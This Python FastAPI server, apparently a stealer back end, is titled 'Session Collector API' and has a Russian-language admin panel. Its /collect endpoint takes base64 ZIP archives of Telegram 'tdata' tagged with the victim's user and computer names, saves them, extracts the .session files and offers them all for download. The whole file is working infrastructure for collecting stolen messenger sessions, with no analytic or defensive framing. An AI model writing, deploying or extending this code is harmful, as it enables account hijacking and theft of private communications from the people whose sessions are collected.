import os
import json
import base64
import zipfile
import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, ValidationError
import uvicorn

app = FastAPI(title="Session Collector API")

UPLOAD_DIR = "uploads"
SESSION_DIR = "sessions"
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(SESSION_DIR, exist_ok=True)

# Шаблоны (Jinja2)
templates = Jinja2Templates(directory="templates")
# Чтобы не создавать папку templates, вставим HTML прямо в код через строку
# Для простоты можно рендерить через строку, но лучше создать templates/index.html
# В целях демонстрации создадим папку и файл при первом запуске
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Session Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab-btn { padding: 8px 20px; cursor: pointer; background: #eee; border: 1px solid #ccc; border-radius: 4px; }
        .tab-btn.active { background: #0066cc; color: white; border-color: #0066cc; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .clickable { cursor: pointer; }
        .clickable:hover { background-color: #f5f5f5; }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: white;
            margin: 10% auto;
            padding: 20px;
            width: 400px;
            border-radius: 8px;
            position: relative;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        .modal-close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
        }
        .modal-btn {
            display: inline-block;
            margin-top: 15px;
            padding: 8px 20px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            text-decoration: none;
            cursor: pointer;
        }
        .modal-btn:hover { background: #0055aa; }
        .info-row { margin: 8px 0; }
    </style>
</head>
<body>
    <h1>📁 Управление сессиями</h1>
    <div class="tabs">
        <button class="tab-btn active" data-tab="tab-uploads">ОСНОВНЫЕ</button>
        <button class="tab-btn" data-tab="tab-sessions">СЕССИИ</button>
    </div>

    <div id="tab-uploads" class="tab-content active">
        <h2>ZIP-архивы (tdata)</h2>
        {% if uploads %}
        <table>
            <tr><th>Имя</th><th>Размер</th><th>Дата</th><th></th></tr>
            {% for f in uploads %}
            <tr class="clickable" data-name="{{ f.name }}" data-size="{{ f.size }}" data-date="{{ f.date }}" data-dl="{{ url_for('download_upload', filename=f.name) }}">
                <td>{{ f.name }}</td>
                <td>{{ f.size }}</td>
                <td>{{ f.date }}</td>
                <td><button onclick="event.stopPropagation(); openModal(this.parentElement.parentElement)">📄</button></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}<p>Нет архивов.</p>{% endif %}
    </div>

    <div id="tab-sessions" class="tab-content">
        <h2>.session файлы</h2>
        {% if sessions %}
        <table>
            <tr><th>Имя</th><th>Размер</th><th>Дата</th><th></th></tr>
            {% for f in sessions %}
            <tr class="clickable" data-name="{{ f.name }}" data-size="{{ f.size }}" data-date="{{ f.date }}" data-dl="{{ url_for('download_session', filename=f.name) }}">
                <td>{{ f.name }}</td>
                <td>{{ f.size }}</td>
                <td>{{ f.date }}</td>
                <td><button onclick="event.stopPropagation(); openModal(this.parentElement.parentElement)">📄</button></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}<p>Нет извлечённых сессий.</p>{% endif %}
    </div>

    <!-- Модальное окно -->
    <div id="modal" class="modal" onclick="if(event.target===this) closeModal()">
        <div class="modal-content">
            <span class="modal-close" onclick="closeModal()">&times;</span>
            <h2 id="modal-title">Информация о файле</h2>
            <div class="info-row"><strong>Имя:</strong> <span id="modal-name"></span></div>
            <div class="info-row"><strong>Размер:</strong> <span id="modal-size"></span> байт</div>
            <div class="info-row"><strong>Дата:</strong> <span id="modal-date"></span></div>
            <a id="modal-dl-btn" class="modal-btn" href="#" download>Скачать</a>
        </div>
    </div>

    <script>
        function openModal(tr) {
            const name = tr.dataset.name;
            const size = tr.dataset.size;
            const date = tr.dataset.date;
            const dl = tr.dataset.dl;

            document.getElementById('modal-name').textContent = name;
            document.getElementById('modal-size').textContent = size;
            document.getElementById('modal-date').textContent = date;
            document.getElementById('modal-dl-btn').href = dl;

            document.getElementById('modal').style.display = 'block';
        }

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeModal();
        });

        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(this.dataset.tab).classList.add('active');
            });
        });
    </script>
</body>
</html>
"""

# Создаём папку templates и пишем туда HTML при старте
os.makedirs("templates", exist_ok=True)
with open("templates/index.html", "w", encoding="utf-8") as f:
    f.write(HTML_TEMPLATE)

# Pydantic модель для входящего JSON
class CollectPayload(BaseModel):
    user: str
    computer: str
    time: str
    data: str  # base64 строка

def extract_sessions_sync(zip_path: str, user: str, computer: str):
    """Синхронная функция распаковки .session файлов"""
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for info in zf.infolist():
                if info.filename.lower().endswith('.session') and not info.is_dir():
                    file_data = zf.read(info.filename)
                    base = os.path.basename(info.filename)
                    safe_user = "".join(c for c in user if c.isalnum() or c in ('-','_')) or "unknown"
                    safe_comp = "".join(c for c in computer if c.isalnum() or c in ('-','_')) or "unknown"
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_name = f"{safe_user}_{safe_comp}_{timestamp}_{base}"
                    dest = os.path.join(SESSION_DIR, new_name)
                    with open(dest, 'wb') as f:
                        f.write(file_data)
    except Exception as e:
        print(f"Extract error: {e}")

def list_files_sync(dir_path: str, ext_filter: str = None):
    files = []
    for fname in os.listdir(dir_path):
        full = os.path.join(dir_path, fname)
        if os.path.isfile(full):
            if ext_filter and not fname.lower().endswith(ext_filter):
                continue
            stat = os.stat(full)
            files.append({
                'name': fname,
                'size': stat.st_size,
                'date': datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            })
    files.sort(key=lambda x: x['date'], reverse=True)
    return files

@app.post("/collect")
async def collect(payload: CollectPayload):
    try:
        # Декодируем base64
        try:
            zip_bytes = base64.b64decode(payload.data)
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Invalid base64: {str(e)}")

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        safe_user = "".join(c for c in payload.user if c.isalnum() or c in ('-','_')) or "unknown"
        safe_computer = "".join(c for c in payload.computer if c.isalnum() or c in ('-','_')) or "unknown"
        filename = f"{safe_user}_{safe_computer}_{timestamp}.zip"
        filepath = os.path.join(UPLOAD_DIR, filename)

        # Сохраняем zip
        with open(filepath, 'wb') as f:
            f.write(zip_bytes)

        # Распаковываем .session (синхронно, но в фоновом потоке не обязательно)
        # Можно запустить в отдельном потоке для асинхронности, но для простоты оставим синхронно
        extract_sessions_sync(filepath, payload.user, payload.computer)

        return {"status": "success", "filename": filename}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    uploads = list_files_sync(UPLOAD_DIR, '.zip')
    sessions = list_files_sync(SESSION_DIR, '.session')
    return templates.TemplateResponse("index.html", {
        "request": request,
        "uploads": uploads,
        "sessions": sessions
    })

@app.get("/download/upload/{filename}")
async def download_upload(filename: str):
    safe_path = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(safe_path):
        raise HTTPException(status_code=404, detail="File not found")
    if not os.path.realpath(safe_path).startswith(os.path.realpath(UPLOAD_DIR)):
        raise HTTPException(status_code=403, detail="Forbidden")
    return FileResponse(safe_path, filename=filename)

@app.get("/download/session/{filename}")
async def download_session(filename: str):
    safe_path = os.path.join(SESSION_DIR, filename)
    if not os.path.exists(safe_path):
        raise HTTPException(status_code=404, detail="File not found")
    if not os.path.realpath(safe_path).startswith(os.path.realpath(SESSION_DIR)):
        raise HTTPException(status_code=403, detail="Forbidden")
    return FileResponse(safe_path, filename=filename)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)